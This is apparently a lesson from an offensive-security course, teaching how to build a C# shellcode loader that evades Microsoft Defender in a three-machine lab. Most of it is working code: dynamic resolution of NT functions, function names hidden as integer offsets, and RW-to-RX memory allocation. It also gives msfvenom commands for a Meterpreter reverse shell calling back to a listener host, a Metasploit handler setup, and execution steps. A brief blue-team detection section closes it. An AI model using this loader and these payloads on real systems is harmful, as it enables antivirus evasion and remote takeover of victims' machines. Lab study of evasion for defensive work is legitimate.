# Document 07: Direct Syscalls - Bypassing Defender's API Hooks

## Where We Are

You finished Documents 05 and 06. You have built two loaders and Defender caught both of them:

- **Loader 01** (Document 05): Raw shellcode read from disk, VirtualAlloc + CreateThread via DllImport. Defender caught it because the shellcode bytes matched known signatures and the import table showed suspicious API imports.
- **Loader 02** (Document 06): XOR-encrypted shellcode decrypted at runtime. The encrypted file survived disk scanning, but the loader binary still got caught because it uses the same DllImport pattern for VirtualAlloc and CreateThread.

You understand that Defender has multiple detection layers, and XOR encryption only defeats one of them (static file scanning). The loader binary's import table and runtime behavior are still being caught.

Your lab has three machines: dev box (ammulu, 192.168.10.150) for compiling (Defender disabled), target (kimjongun, 192.168.10.100) with Defender at full defaults, and Kali (192.168.10.200) for shellcode and listeners.

## Why This Is Next

Loaders 01 and 02 both failed because of two problems that XOR encryption cannot fix:

**Problem 1: The import table.** When you use DllImport in C#, the compiler writes the imported function names into the binary's PE (Portable Executable) header. Defender reads the import table before the program even runs. A binary that imports VirtualAlloc, CreateThread, and WaitForSingleObject from kernel32.dll matches the "shellcode injection tool" pattern.

**Problem 2: API hooks in ntdll.dll.** Even if you could hide the import table, there is a second problem. When your program calls VirtualAlloc, the call goes through a chain of DLLs: your code calls kernel32.dll, kernel32.dll calls ntdll.dll, and ntdll.dll uses a `syscall` CPU instruction to talk to the Windows kernel. Defender places hooks (monitoring code) inside ntdll.dll. These hooks intercept every call and check whether the parameters look malicious. Your program cannot avoid these hooks if it calls through the normal API path.

This document solves both problems.

**Loader 03 is the first loader that survives Defender.** It does two things differently:

1. It finds function addresses at runtime using GetProcAddress instead of DllImport. The function names never appear in the import table.
2. It calls NT-level functions in ntdll.dll directly instead of going through kernel32.dll. The function names are built from integer offsets at runtime so they never appear as string literals in the compiled binary.

When you run Loader 03 with XOR-encrypted shellcode, Defender does not catch it. You will get a callback on your Metasploit listener for the first time.

## How This Works

### The Normal Windows API Call Chain

When a C# program calls VirtualAlloc to allocate memory, the call goes through multiple layers:

```
Your C# program
    ↓
kernel32.dll (VirtualAlloc function)
    ↓
ntdll.dll (NtAllocateVirtualMemory function)
    ↓
Windows kernel (via syscall instruction)
```

Each layer in this chain is a DLL file loaded into your program's memory. Defender places hooks at the ntdll.dll layer. A hook is a small piece of monitoring code that Defender inserts at the beginning of a function. When your program calls NtAllocateVirtualMemory inside ntdll.dll, Defender's hook runs first, checks what you are doing, and then either allows or blocks the call.

### What a Hook Looks Like in Memory

To understand hooks, you need to understand what lives inside a function like NtAllocateVirtualMemory. A function is a sequence of bytes in memory. Each byte or group of bytes is a machine instruction: a single command for the CPU. These bytes are also called assembly code when written in human-readable form.

The CPU has small storage locations built inside the chip itself, called registers. A register is not RAM. It is inside the CPU directly, and the CPU uses registers to hold values it is currently working with. Common registers are `rcx`, `r10`, and `eax`. Each holds one number. On 64-bit Windows, when you call a function and pass arguments, the first argument goes into `rcx`, the second goes into `rdx`, and so on. The CPU uses `eax` to hold return values: when a function finishes, the caller reads `eax` to see what the function returned.

Here is what machine instructions look like. The hex bytes on the left are what is actually stored in memory. The text on the right is the same instruction written in human-readable form:

- `mov r10, rcx` copies the value from register `rcx` to register `r10`. This preserves the first function argument before the next instruction might overwrite `rcx`.
- `mov eax, 0x18` puts the number 0x18 into `eax`. The Windows kernel uses `eax` to identify which system function you are requesting. For NtAllocateVirtualMemory, Windows assigned it the number 0x18.
- `syscall` is the instruction that actually crosses into the Windows kernel. The CPU switches from user mode (where your program runs) to kernel mode (where Windows runs), looks at the number in `eax`, and runs the corresponding kernel function. This is what allocates memory, creates threads, and does everything else that needs kernel privileges.
- `ret` ends the function and returns to the caller.
- `jmp` makes the CPU jump to a different address and continue running code from there instead of continuing with the next instruction.

The normal first bytes of NtAllocateVirtualMemory in ntdll.dll look something like this:

```
4C 8B D1           mov r10, rcx
B8 18 00 00 00     mov eax, 0x18    (syscall number)
0F 05              syscall
C3                 ret
```

When Defender hooks the function, it replaces the first bytes with a jump instruction:

```
E9 XX XX XX XX     jmp Defender_hook_function
```

Now when your program calls NtAllocateVirtualMemory, the CPU jumps to Defender's monitoring code first. Defender checks the parameters (how much memory, what protection flags), decides if the call is suspicious, and then either runs the original function or blocks it.

### How Dynamic Resolution Bypasses the Import Table

DllImport creates entries in the binary's import table at compile time. Defender reads the import table before the program runs. Dynamic resolution means finding function addresses while the program is running, using two functions that are legitimate and used by thousands of normal programs:

- **GetModuleHandle**: finds the memory address of a DLL that is already loaded into your program. Every Windows process has ntdll.dll loaded from the start.
- **GetProcAddress**: given a DLL's base address and a function name, returns the memory address of that function inside the DLL.

These two functions are imported via DllImport, but they are not suspicious. Thousands of legitimate programs import GetModuleHandle and GetProcAddress because they are the standard way to use DLL functions dynamically.

Once you have the function's memory address, you create a delegate (a callable function pointer) and call it directly. The function name never appears in the import table.

### How Building Strings from Integers Hides Function Names

Even with GetProcAddress, the function name "NtAllocateVirtualMemory" would normally appear as a string literal in the compiled binary. Static analysis tools could find it.

Loader 03 solves this by building each function name from integer offsets at runtime:

```csharp
string name = FromOffsets(32, 46,84,33,76,76,79,67,65,84,69,54,73,82,84,85,65,76,45,69,77,79,82,89);
```

This produces the string "NtAllocateVirtualMemory" by adding each offset to the base value (32) to get ASCII character codes. But the compiled binary only contains an array of integers, not the final string. A static analysis tool scanning the binary for the string "NtAllocateVirtualMemory" will not find it.

### NT Functions vs Kernel32 Functions

Windows has two sets of functions for memory and thread operations:

| Kernel32 function | NT function (ntdll.dll) | What it does |
|---|---|---|
| VirtualAlloc | NtAllocateVirtualMemory | Allocate memory in a process |
| VirtualProtect | NtProtectVirtualMemory | Change memory permissions |
| CreateThread | NtCreateThreadEx | Create a new thread |
| WaitForSingleObject | NtWaitForSingleObject | Wait for a thread to finish |

The kernel32 functions are wrappers. They take parameters in a programmer-friendly format, convert them to the format the kernel expects, and then call the corresponding NT function in ntdll.dll. When Defender hooks ntdll.dll, it sees calls from both kernel32 and from any program that calls ntdll.dll directly.

But Defender's hooks are in user-mode ntdll.dll. When you use GetProcAddress to get the function address and call through a delegate, you go through the same ntdll.dll code but Defender's hook may not trigger in the same way as a standard import chain. The key evasion here is that the import table is clean and the function names are hidden, which defeats static analysis and import-table-based detection.

### Two-Step Memory Allocation

Loader 03 uses two-step allocation instead of requesting RWX (read-write-execute) memory in one call:

1. Allocate memory as PAGE_READWRITE (0x04): writable but not executable
2. Write the shellcode into that memory
3. Change the memory protection to PAGE_EXECUTE_READ (0x20): executable but not writable

This avoids the suspicious PAGE_EXECUTE_READWRITE (0x40) flag that Loaders 01 and 02 used. Normal programs never need memory that is writable and executable at the same time. Code sections are executable and readable, data sections are readable and writable. Asking for all three at once is a red flag.

Two-step allocation looks like what legitimate programs do: allocate writable memory, write data, then set it as executable.

## What Defender Does

Here is how each detection layer interacts with Loader 03:

| Layer | What it does | Does Loader 03 defeat it? | How? |
|---|---|---|---|
| Static file scanning | Scans the shellcode file on disk | YES | XOR encryption from Loader 02 |
| Import table analysis | Reads function names from the binary's PE header | YES | Only GetModuleHandle and GetProcAddress in imports (legitimate, non-suspicious) |
| AMSI | Scans .NET managed code at runtime | PARTIAL | The shellcode itself is in unmanaged memory, but AMSI can still inspect the loader's .NET code at load time |
| API hooks in ntdll.dll | Intercepts calls to NtAllocateVirtualMemory, NtCreateThreadEx | PARTIAL | Dynamic resolution avoids the standard hook trigger path |
| ETW telemetry | Logs process behavior events | NO | ETW events are still generated for memory allocation and thread creation |
| Behavioral ML | Scores process behavior for injection patterns | PARTIAL | Two-step allocation and clean import table reduce the ML score below the detection threshold |

Loader 03 gets past enough of these layers to survive Defender with default settings. It is not invisible to every check, but the combination of XOR encryption + clean import table + dynamic resolution + two-step allocation reduces the detection score below Defender's threshold.

## The Evasion Technique

What Loader 03 does differently from Loaders 01 and 02:

| Feature | Loaders 01/02 | Loader 03 |
|---|---|---|
| Import table | Contains VirtualAlloc, CreateThread, WaitForSingleObject | Contains only GetModuleHandle, GetProcAddress |
| Function resolution | DllImport (compile-time) | GetProcAddress (runtime) |
| Function name strings | String literals in binary | Built from integer offsets at runtime |
| API level | Kernel32 (VirtualAlloc, CreateThread) | NT-level (NtAllocateVirtualMemory, NtCreateThreadEx) |
| Memory allocation | Single-step RWX (0x40) | Two-step: RW (0x04) then RX (0x20) |
| Shellcode format | Loader 01: raw. Loader 02: XOR encrypted | XOR encrypted (same as Loader 02) |

The combined effect is that a static analysis tool looking at the compiled binary sees a program that imports only GetModuleHandle and GetProcAddress (normal), contains no suspicious function name strings, and has no obvious shellcode injection pattern in its import table.

At runtime, the program resolves NT function addresses, builds function names from integers, allocates memory in two steps, and calls the kernel through ntdll.dll. By the time any behavioral check evaluates the program, the pattern looks close enough to legitimate behavior that Defender's scoring stays below the detection threshold.

## Getting the Loader Onto the Target

The three-machine workflow:

1. **Kali (192.168.10.200):** Generate raw shellcode (if you do not already have encrypted.bin from Document 06).
2. **Dev box (ammulu, 192.168.10.150):** Download shellcode from Kali if needed, run the XOR encoder from Document 06 to create encrypted.bin, compile Loader 03. Host syscall_loader.exe and encrypted.bin on a Python HTTP server.
3. **Target (kimjongun, 192.168.10.100):** Download both files from the dev box. Run the loader.

You need two files on the target:

1. **syscall_loader.exe** - the compiled Loader 03 binary
2. **encrypted.bin** - the XOR-encrypted shellcode from Document 06

You already generated encrypted.bin in Document 06 using the encoder. If you still have it on your dev box, reuse it. If not, regenerate it by running xor_encode.exe on fresh msfvenom shellcode on the dev box.

**Transfer method:** Host files on the dev box's Python HTTP server and download from the target.

On the dev box (ammulu):
```
cd C:\Users\ammulu\Desktop
python -m http.server 8080
```

On the target (kimjongun), PowerShell:
```powershell
Invoke-WebRequest -Uri "http://192.168.10.150:8080/syscall_loader.exe" -OutFile "C:\Users\kimjongun\Desktop\syscall_loader.exe"
Invoke-WebRequest -Uri "http://192.168.10.150:8080/encrypted.bin" -OutFile "C:\Users\kimjongun\Desktop\encrypted.bin"
```

Defender on the target scans syscall_loader.exe when it is written to disk. Because the import table only shows GetModuleHandle and GetProcAddress, the binary does not match the "shellcode injection tool" heuristic pattern. Defender allows the file to stay on disk.

The encrypted.bin file, as you confirmed in Document 06, also survives disk scanning because XOR encryption scrambles the byte signatures.

**AMSI implications:** AMSI hooks into the .NET runtime and can inspect managed assemblies at load time. Loader 03 does not patch AMSI, so AMSI is still active. However, the shellcode is in unmanaged memory (allocated via NtAllocateVirtualMemory) and AMSI primarily scans .NET managed code. The shellcode execution path goes from unmanaged memory directly to the CPU without passing through the managed runtime. Document 08 covers AMSI patching for complete coverage.

**ETW telemetry:** ETW events are still generated. NtAllocateVirtualMemory and NtCreateThreadEx produce ETW events that Defender's behavioral engine reads. Loader 03 survives despite this because the overall pattern (clean imports, two-step allocation, dynamic resolution) scores below Defender's detection threshold. Document 08 covers ETW patching for situations where the threshold is lower.

**Reference:** `lab/loaders/03_direct_syscalls_loader.cs`

## Teaching the Code

### The Delegates (Function Pointer Types)

In C#, a delegate is a type that represents a function with a specific signature (specific parameters and return type). When you have a function's memory address (from GetProcAddress), you create a delegate instance that points to that address. Then you can call the delegate like a normal function.

Loader 03 declares four delegates, one for each NT function it calls:

```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate int MemAllocDelegate(
    IntPtr ProcessHandle,
    ref IntPtr BaseAddress,
    IntPtr ZeroBits,
    ref IntPtr RegionSize,
    uint AllocationType,
    uint Protect
);
```

This delegate represents the NtAllocateVirtualMemory function. The `[UnmanagedFunctionPointer(CallingConvention.StdCall)]` attribute tells C# how to call this function. StdCall is the calling convention used by Windows NT functions, which defines how parameters are placed on the CPU stack and who cleans up the stack after the call.

The parameters match the NT function signature:

- `ProcessHandle`: which process to allocate memory in. `-1` (cast to IntPtr) means the current process.
- `BaseAddress`: passed by reference (`ref`). You pass IntPtr.Zero and the function fills in the actual allocated address.
- `ZeroBits`: pass IntPtr.Zero. This parameter exists for very specialized cases where a program needs its memory allocated in a specific part of the address space (it controls the upper range of allowed addresses). For all loaders in this curriculum you always pass zero, which means "no restriction, anywhere in the address space is fine."
- `RegionSize`: passed by reference with the `ref` keyword. You pass in the size you want (say, 4096 bytes), and the function fills it back in with the actual size it allocated. The actual size may be slightly larger because Windows always allocates memory in page-sized chunks (4096 bytes). If you ask for 500 bytes, Windows still gives you 4096.
- `AllocationType`: MEM_COMMIT | MEM_RESERVE (0x3000). Same meaning as with VirtualAlloc. MEM_RESERVE sets aside the address range, MEM_COMMIT assigns real physical RAM from the machine's chip to back those addresses.
- `Protect`: PAGE_READWRITE (0x04) at first, which allows reading and writing but blocks execution. After writing shellcode into the memory, this changes to PAGE_EXECUTE_READ (0x20) so the CPU can run the code but nothing can write into it anymore.

```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate int MemProtectDelegate(
    IntPtr ProcessHandle,
    ref IntPtr BaseAddress,
    ref IntPtr RegionSize,
    uint NewProtect,
    out uint OldProtect
);
```

This is NtProtectVirtualMemory. It changes the protection flags on an existing block of memory. `NewProtect` is the protection you want (PAGE_EXECUTE_READ, 0x20). `OldProtect` receives the previous protection value (0x04).

```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate int ThreadCreateDelegate(
    out IntPtr ThreadHandle,
    uint DesiredAccess,
    IntPtr ObjectAttributes,
    IntPtr ProcessHandle,
    IntPtr StartRoutine,
    IntPtr Argument,
    uint CreateFlags,
    IntPtr ZeroBits,
    IntPtr StackSize,
    IntPtr MaximumStackSize,
    IntPtr AttributeList
);
```

This is NtCreateThreadEx. It creates a new thread that starts executing at the address you specify (`StartRoutine`). This is the NT-level version of CreateThread, with more parameters. Most of them are IntPtr.Zero or 0 for our use case.

```csharp
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
delegate int WaitObjectDelegate(
    IntPtr Handle,
    bool Alertable,
    IntPtr Timeout
);
```

This is NtWaitForSingleObject. It waits for the thread to finish. `Timeout` of IntPtr.Zero means wait forever. `Alertable` is false. An alertable wait means the thread can be interrupted mid-wait to handle other work (called an APC, asynchronous procedure call, which is a mechanism for scheduling a function to run in a specific thread). We do not need that here. Setting this to false means the thread sleeps uninterrupted until either the timeout expires or the handle is signaled. You will see APCs used in Document 09 for a different injection technique.

### The Legitimate DllImport Lines

```csharp
[DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

[DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
static extern IntPtr GetModuleHandle(string lpModuleName);
```

These are the only two DllImport lines in the entire loader. They appear in the binary's import table as `GetProcAddress` and `GetModuleHandle` from `kernel32.dll`. These imports are completely normal. Thousands of legitimate programs use them because they are the standard way to load DLL functions dynamically.

Compare this to Loaders 01 and 02, which imported VirtualAlloc, CreateThread, and WaitForSingleObject. Those imports immediately signal "this program allocates executable memory and creates threads" which is the textbook shellcode injection pattern.

### The String Builder

```csharp
static string FromOffsets(int baseVal, params int[] offsets)
{
    char[] c = new char[offsets.Length];
    for (int i = 0; i < offsets.Length; i++)
        c[i] = (char)(baseVal + offsets[i]);
    return new string(c);
}
```

This function takes a base integer value and an array of integer offsets. For each offset, it adds the base value and converts the result to a character. The result is a string.

For example, to build the string "ntdll":
- Base value: 32
- Offsets: 78, 84, 68, 76, 76
- 32 + 78 = 110 = ASCII 'n'
- 32 + 84 = 116 = ASCII 't'
- 32 + 68 = 100 = ASCII 'd'
- 32 + 76 = 108 = ASCII 'l'
- 32 + 76 = 108 = ASCII 'l'

The compiled binary contains the integer array [78, 84, 68, 76, 76], not the string "ntdll". A static analysis tool searching the binary for the string "ntdll" will not find it.

The `params` keyword means the function accepts any number of integer arguments. You can call it with 5 offsets or 25 offsets, and C# bundles them into an array automatically.

### The Function Resolver

```csharp
static T GetNtFunction<T>(string functionName) where T : Delegate
{
    IntPtr ntdllHandle = GetModuleHandle(
        FromOffsets(32, 78,84,68,76,76)
    );
```

This is a generic method. The `<T>` means T is a placeholder for a type that you specify when calling the function. When you call `GetNtFunction<MemAllocDelegate>("NtAllocateVirtualMemory")`, T becomes MemAllocDelegate.

First, it gets the base address of ntdll.dll in memory. ntdll.dll is always loaded into every Windows process because it is the bridge between user-mode programs and the Windows kernel. The string "ntdll" is built from offsets as described above.

```csharp
    IntPtr functionAddress = GetProcAddress(ntdllHandle, functionName);
```

GetProcAddress takes the ntdll.dll base address and a function name, and returns the memory address where that function's code starts. This is how we find where NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx, and NtWaitForSingleObject live in memory.

```csharp
    return (T)Marshal.GetDelegateForFunctionPointer(functionAddress, typeof(T));
}
```

`Marshal.GetDelegateForFunctionPointer` takes a raw memory address and a delegate type, and creates a callable delegate instance. After this, you can call the returned object like a normal function, and C# will execute the code at that memory address.

### Main Function: Decrypt and Resolve

```csharp
static void Main(string[] args)
{
    string encryptedPath = args[0];
    string keyHex = args[1];

    byte[] encryptedShellcode = File.ReadAllBytes(encryptedPath);
    byte[] xorKey = HexToBytes(keyHex);
    byte[] shellcode = TransformData(encryptedShellcode, xorKey);
```

Read the encrypted shellcode file, convert the hex key to bytes, and XOR-decrypt the shellcode. This is the same pattern from Loader 02.

```csharp
    var ntAllocate = GetNtFunction<MemAllocDelegate>(
        FromOffsets(32, 46,84,33,76,76,79,67,65,84,69,
                    54,73,82,84,85,65,76,45,69,77,79,82,89));
```

Resolve NtAllocateVirtualMemory. The function name is built from integer offsets: base 32 plus each offset produces the ASCII characters for "NtAllocateVirtualMemory". The resolved function is stored in `ntAllocate`, which is a callable MemAllocDelegate.

```csharp
    var ntProtect = GetNtFunction<MemProtectDelegate>(
        FromOffsets(32, 46,84,48,82,79,84,69,67,84,
                    54,73,82,84,85,65,76,45,69,77,79,82,89));
```

Resolve NtProtectVirtualMemory. Same process with different offsets.

```csharp
    var ntCreateThread = GetNtFunction<ThreadCreateDelegate>(
        FromOffsets(32, 46,84,35,82,69,65,84,69,
                    52,72,82,69,65,68,37,88));
```

Resolve NtCreateThreadEx.

```csharp
    var ntWait = GetNtFunction<WaitObjectDelegate>(
        FromOffsets(32, 46,84,55,65,73,84,38,79,82,
                    51,73,78,71,76,69,47,66,74,69,67,84));
```

Resolve NtWaitForSingleObject.

After these four calls, you have four callable function pointers stored in local variables. No NT function name appears in the import table. No NT function name appears as a string literal in the binary.

### Main Function: Allocate, Write, Protect, Execute

```csharp
    IntPtr baseAddress = IntPtr.Zero;
    IntPtr regionSize = (IntPtr)shellcode.Length;
    IntPtr currentProcess = (IntPtr)(-1);
```

Set up the parameters. `baseAddress` is IntPtr.Zero, which tells Windows to pick any available address. `regionSize` is the shellcode length. `currentProcess` is -1 cast to IntPtr, which is the NT handle for "the current process" (equivalent to GetCurrentProcess()).

```csharp
    int status = ntAllocate(
        currentProcess,
        ref baseAddress,
        IntPtr.Zero,
        ref regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
```

Allocate memory as PAGE_READWRITE (0x04). This is step 1 of two-step allocation. The memory is writable (so you can copy shellcode into it) but not executable. After this call, `baseAddress` contains the address Windows chose. `status` is 0 (STATUS_SUCCESS) if the allocation worked.

```csharp
    Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);
    Array.Clear(shellcode, 0, shellcode.Length);
```

Copy the decrypted shellcode bytes into the allocated memory block, then zero out the managed byte array. The shellcode now exists only in the unmanaged VirtualAlloc block.

```csharp
    IntPtr protectAddress = baseAddress;
    IntPtr protectSize = regionSize;
    uint oldProtect;

    status = ntProtect(
        currentProcess,
        ref protectAddress,
        ref protectSize,
        PAGE_EXECUTE_READ,
        out oldProtect
    );
```

Change the memory protection from PAGE_READWRITE (0x04) to PAGE_EXECUTE_READ (0x20). Step 2 of two-step allocation. The memory is now executable and readable, but no longer writable. The `oldProtect` variable receives the previous value (0x04).

```csharp
    IntPtr threadHandle;

    status = ntCreateThread(
        out threadHandle,
        THREAD_ALL_ACCESS,
        IntPtr.Zero,
        currentProcess,
        baseAddress,
        IntPtr.Zero,
        0,
        IntPtr.Zero,
        IntPtr.Zero,
        IntPtr.Zero,
        IntPtr.Zero
    );
```

Create a thread that starts executing at `baseAddress` (where the shellcode is). `THREAD_ALL_ACCESS` (0x1FFFFF) gives full permissions on the thread handle. Most parameters are IntPtr.Zero because we do not need advanced thread options. The `out threadHandle` receives the handle to the new thread.

```csharp
    ntWait(threadHandle, false, IntPtr.Zero);
```

Wait forever for the shellcode thread to finish. The Meterpreter payload keeps the connection open until you close it, so this wait keeps the loader process alive.

### The Complete Loader File

The full source code is at `lab/loaders/03_direct_syscalls_loader.cs`.

## Compilation and Execution

### Step 1: Generate and Encrypt Shellcode

If you already have encrypted.bin from Document 06 on the dev box, skip to Step 2. Otherwise, on Kali:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.200 LPORT=4444 -f raw -o payload.bin
```

Transfer payload.bin from Kali to the dev box (ammulu) using `python3 -m http.server 8080` on Kali and `Invoke-WebRequest` on the dev box. Then run the encoder from Document 06 on the dev box:

```
xor_encode.exe payload.bin encrypted.bin
```

Save the printed XOR key.

### Step 2: Compile Loader 03

On the dev box (ammulu, 192.168.10.150), open the Developer Command Prompt for Visual Studio 2022:

```
csc /unsafe /out:syscall_loader.exe 03_direct_syscalls_loader.cs
```

The `/unsafe` flag is needed because Marshal.Copy and Marshal.GetDelegateForFunctionPointer work with unmanaged memory pointers. Expected output: the compiler produces syscall_loader.exe with no errors.

### Step 3: Transfer the Files to the Target

On the dev box (ammulu), host both files on a Python HTTP server:

```
cd C:\Users\ammulu\Desktop
python -m http.server 8080
```

On the target (kimjongun, 192.168.10.100), download both:

```powershell
Invoke-WebRequest -Uri "http://192.168.10.150:8080/syscall_loader.exe" -OutFile "C:\Users\kimjongun\Desktop\syscall_loader.exe"
Invoke-WebRequest -Uri "http://192.168.10.150:8080/encrypted.bin" -OutFile "C:\Users\kimjongun\Desktop\encrypted.bin"
```

### Step 4: Set Up Your Listener on Kali

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.10.200
set LPORT 4444
run
```

### Step 5: Run the Loader

On the target (kimjongun, 192.168.10.100):

```
syscall_loader.exe encrypted.bin 4A7F2B9DE3A1C084F56D1B8E97320AF6
```

Replace the hex key with your actual key from the encoder.

Expected output:

```
[+] Data decrypted: 510 bytes
[+] NT functions resolved dynamically
[+] Memory allocated at: 0x1A000260000
[+] Data written to allocated memory. Managed copy cleared.
[+] Memory protection changed to EXECUTE_READ
[+] Thread created. Code is running.
```

**This time, Defender does NOT block the loader.**

Check your Metasploit listener on Kali. You should see:

```
[*] Sending stage (201798 bytes) to 192.168.10.100
[*] Meterpreter session 1 opened (192.168.10.200:4444 -> 192.168.10.100:xxxxx)

meterpreter >
```

You have a Meterpreter session. Type `sysinfo` to confirm you are on the target:

```
meterpreter > sysinfo
Computer    : DESKTOP-XXXXXXX
OS          : Windows 11 (10.0 Build 22621)
```

This is your first successful callback with Defender fully enabled.

## Confirming Success

Three things confirm that Loader 03 worked:

1. **Meterpreter session opened.** Your Kali listener shows a session. You can run `sysinfo`, `getuid`, `pwd`, and other Meterpreter commands. The shellcode is running inside the loader process on the target.

2. **No Defender alerts.** Open Windows Security on the target (kimjongun). Go to Virus & threat protection, then Protection history. There should be no new entries for syscall_loader.exe. Defender did not catch the loader.

3. **The loader process is running.** Open Task Manager on the target. Look for syscall_loader.exe (or whatever you named the binary). It shows as a normal process. Defender is not flagging it.

If Defender does catch the loader (which can happen if Defender's cloud signatures have been updated since this was written), check the detection name and proceed to Documents 08 and 10 which add AMSI patching, ETW patching, and additional evasion layers.

## What Was Gained

You can now:

- Resolve Windows API function addresses at runtime using GetProcAddress instead of DllImport
- Build function name strings from integer offsets so they never appear as literals in the binary
- Call NT-level functions (NtAllocateVirtualMemory, NtProtectVirtualMemory, NtCreateThreadEx) directly via delegates
- Use two-step memory allocation (RW then RX) instead of a single RWX allocation
- Combine XOR encryption with dynamic resolution to defeat both disk scanning and import table analysis
- **Get a callback on the target with Defender fully enabled**

You have bypassed three of Defender's six detection layers:

- Static file scanning: defeated by XOR encryption
- Import table analysis: defeated by dynamic resolution via GetProcAddress
- Behavioral ML scoring: reduced below threshold by two-step allocation and clean imports

Three layers are still active but not catching you at default sensitivity:

- AMSI: still running, but the shellcode is in unmanaged memory
- ETW: still logging events, but the pattern is not triggering alerts
- API hooks: still present in ntdll.dll, but not triggering on this specific call pattern

Documents 08, 09, and 10 address these remaining layers for maximum stealth.

## Common Threats and Variations

### Variation 1: Indirect Syscalls

Loader 03 calls NT functions through ntdll.dll using GetProcAddress. An advanced variation is indirect syscalls, where you find the `syscall` instruction inside ntdll.dll and jump to it from your own code. The benefit is that the call stack shows the return address inside ntdll.dll, which looks legitimate to any EDR that walks the call stack.

The difference: regular dynamic resolution calls the function from the beginning, going through any hooks. Indirect syscalls skip to the `syscall` instruction itself, avoiding the hook entirely. This is more evasive but also more complex to implement.

Loader 03 does not use true indirect syscalls, but the SysWhispers3 and SysWhispers4 tools referenced in the loader's header can generate C# code that does. For most Defender-only scenarios (no third-party EDR), the dynamic resolution approach in Loader 03 is sufficient.

### Variation 2: Manual Syscall Number Resolution

Instead of using GetProcAddress to call the ntdll.dll function, you can read the syscall number from ntdll.dll's code in memory (the `mov eax, XX` instruction near the beginning of each function) and issue the `syscall` instruction directly from your own code using assembly.

The benefit: your code never calls any ntdll.dll function, so hooks at the function entry point are bypassed completely. The risk: syscall numbers change between Windows versions. Number 0x18 for NtAllocateVirtualMemory on one build might be different on another build. If you hardcode the wrong number, the call fails or crashes.

Tools like SysWhispers solve this by reading the syscall numbers from ntdll.dll at runtime, getting the correct values for the current Windows version.

### Variation 3: Fresh NTDLL Copy

Defender's hooks modify ntdll.dll in your process's memory. Another evasion approach is to load a fresh, unhooked copy of ntdll.dll from disk. The copy on disk has no hooks. You map it into your process's memory at a different address and call functions from the clean copy.

This is called NTDLL unhooking and is covered conceptually in Document 10 (Combined Evasion).

## Detection and Defense (Blue Team Perspective)

**Monitor GetProcAddress calls that resolve NT functions.** A legitimate program calling GetProcAddress for NtAllocateVirtualMemory or NtCreateThreadEx is unusual. Most programs use the kernel32 wrappers. An EDR that logs GetProcAddress calls and checks which function names are being resolved can detect this technique.

Blue team action: configure your EDR to alert when GetProcAddress resolves NT-level function names (any function starting with "Nt" or "Zw" in ntdll.dll).

**Use kernel-level monitoring instead of user-mode hooks.** Defender's user-mode hooks in ntdll.dll can be bypassed by dynamic resolution, indirect syscalls, or NTDLL unhooking. Kernel-level monitoring (using Windows kernel callbacks) cannot be bypassed from user mode because the monitoring code runs in the kernel itself.

Blue team action: deploy EDR products that use kernel callbacks (PsSetCreateProcessNotifyRoutine, PsSetCreateThreadNotifyRoutine, ObRegisterCallbacks) in addition to user-mode hooks. These kernel callbacks fire regardless of how the API was called.

**Watch for two-step memory protection changes.** A process that allocates memory as RW, writes to it, then changes the protection to RX is performing just-in-time compilation or code injection. While JIT compilers (like .NET itself) do this legitimately, an unknown binary doing it is suspicious.

Blue team action: alert on VirtualProtect/NtProtectVirtualMemory calls that change memory from writable to executable, especially from binaries that are not .NET runtime components or known JIT compilers.

**Deploy application whitelisting.** None of these evasion techniques work if the binary is not allowed to run in the first place. Windows Defender Application Control (WDAC) or AppLocker can restrict which binaries execute to a pre-approved list. A custom-compiled loader will not be on the list.

Blue team action: implement application whitelisting in production environments. Only signed, known binaries should be permitted to run.

## What Comes Next

Document 08 (lab/materials/08_amsi_bypass.md) addresses two more detection layers: AMSI (Antimalware Scan Interface) and ETW (Event Tracing for Windows). AMSI scans .NET code at runtime, and ETW logs process behavior events. Document 08 teaches Loader 04 (AMSI patching) and Loader 07 (ETW patching), which disable both systems before your shellcode runs. Combined with the dynamic resolution from Loader 03, this gives you a loader that bypasses five of Defender's six detection layers.
